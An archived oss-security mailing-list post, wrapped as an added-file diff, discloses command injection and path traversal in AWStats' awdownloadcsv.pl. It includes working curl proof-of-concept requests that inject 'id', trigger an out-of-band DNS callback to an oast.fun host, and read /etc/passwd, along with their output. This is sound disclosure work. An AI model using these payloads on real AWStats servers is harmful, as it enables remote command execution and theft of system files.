@@ -1,0 +1,256 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - AWStats awdownloadcsv.pl command injection and path traversal vulnerabilities</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="7">[&lt;prev]</a> <a href="9">[next&gt;]</a> <a href="9">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;Z2Y_rOJaVlLCYFBjgdkkl4SNaDAPnNTwxykLMSRBhRmA_lpIrjmLP4zrLhBwL1KHxJ465aMmWAEG4nTm5bHvY2o7KMUdoUJ-427OZLiHxDk=&#64;vadersecurity.com&gt;
+Date: Sun, 08 Mar 2026 08:26:23 +0000
+From: "christopher.downs" &lt;christopher.downs&#64;...ersecurity.com&gt;
+To: "oss-security&#64;...ts.openwall.com" &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: AWStats awdownloadcsv.pl command injection and path traversal vulnerabilities
+
+Evening,
+Two vulnerabilities were identified in the AWStats CGI script awdownloadcsv.pl that may allow command injection and arbitrary file access.
+
+Repository:
+<a href="https://github.com/eldy/AWStats/tree/develop" rel="nofollow">https://github.com/eldy/AWStats/tree/develop</a>
+
+Examples shown below are running locally in a Docker container for demonstration. 
+
+Download functionality is disabled. The Default. 
+my $ALLOWDOWNLOAD=0
+
+#!/usr/bin/perl -w#------------------------------------------------------------------------------
+# Free addition to AWStats Web Log Analyzer. Used to export the contents of
+# sections of the Apache server log database to CSV for use in other tools.
+# Works from command line or as a CGI.
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation; either version 2 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see &lt;<a href="http://www.gnu.org/licenses/" rel="nofollow">http://www.gnu.org/licenses/</a>&gt;.
+#------------------------------------------------------------------------------
+use CGI qw(:standard);
+
+my $ALLOWDOWNLOAD=0;
+----- SNIP -----
+
+Issue 1: Command Injection
+
+The "section" parameter appears to be incorporated into shell commands without proper sanitization. Injection of shell metacharacters such as "|" may allow an attacker to escape the intended command pipeline. 
+
+Example request(s):
+
+vectorium-x[main] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awdownloadcsv.pl?section=&amp;inputFile=|id&amp;outputFile=/tmp/j.csv'uid=33(www-data) gid=33(www-data) groups=33(www-data)
+vectorium-x[main] %
+
+vectorium-x[main*] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awdownloadcsv.pl?section=&amp;inputFile=|getent%20hosts%20d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o.oast.fun&amp;outputFile=/tmp/j.csv'
+
+206.189.156.69  d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o.oast.fun
+vectorium-x[main*] %
+
+/tmp % interactsh-client -dns-only -o /tmp/interact_$(date +%s).interact
+    _       __                       __       __
+   (_)___  / /____  _________ ______/ /______/ /_
+  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
+ / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
+/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/
+
+projectdiscovery.io
+
+[INF] Current interactsh version 1.3.0 (latest)
+[INF] Listing 1 payload for OOB Testing
+[INF] d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o.oast.fun
+[d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o] Received DNS interaction (AAAA) from 66.185.115.247 at 2026-03-08 07:02:25
+[d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o] Received DNS interaction (AAAA) from 66.185.115.247 at 2026-03-08 07:02:25
+[d6mhta6p9lkdgas4c2r0ujhuo3iyb8n4o] Received DNS interaction (A) from 66.185.115.247 at 2026-03-08 07:02:25
+
+Issue 2: Path Traversal / Arbitrary File Read
+
+The "inputFile" parameter is used directly in file operations without validation, allowing directory traversal.
+
+Example code pattern:
+
+if ($q-&gt;param("inputFile")) {
+if ($inputFile eq '') { $inputFile = $q-&gt;param("inputFile"); }
+}
+
+open (IN, $inputFile) || die "cannot open $inputFile\n";
+
+Example request:
+
+vectorium-x[main] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awdownloadcsv.pl?section=|root&amp;inputFile=..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&amp;outputFile=/tmp/pwnd.csv'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing,List,Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+vectorium-x[main] %
+
+/tmp/pwnd.csv written to disk:
+vectorium-x[main] % curl -q --path-as-is 'http://127.0.0.1:8888/awstats/awdownloadcsv.pl?section=|root&amp;inputFile=|cat%20/tmp/pwnd.csv&amp;outputFile='daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+----- SNIP -----
+
+Impact
+
+Depending on deployment configuration, these issues may allow:
+
+-   command execution
+    
+
+-   reading arbitrary files
+    
+
+-   writing attacker-controlled output files
+    
+
+
+Disclosure
+
+The upstream developer was contacted previously regarding these issues. No response was received, so this notice is being sent to the oss-security list for awareness.
+
+August 30th 2025
+September 6th 2025
+
+Thanks All --
+
+
+Sent with Proton Mail secure email.
+<span style="font-family: times;"><strong>Content of type "</strong>text/html<strong>" skipped</strong></span>
+
+<span style="font-family: times;"><strong>Download attachment "</strong><a href="8/1" rel="nofollow" download>publickey - christopher.downs&#64;...ersecurity.com - 0x9776492D.asc</a><strong>" of type "</strong>application/pgp-keys<strong>" (3125 bytes)</strong></span>
+
+<span style="font-family: times;"><strong>Download attachment "</strong><a href="8/2" rel="nofollow" download>signature.asc</a><strong>" of type "</strong>application/pgp-signature<strong>" (950 bytes)</strong></span>
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
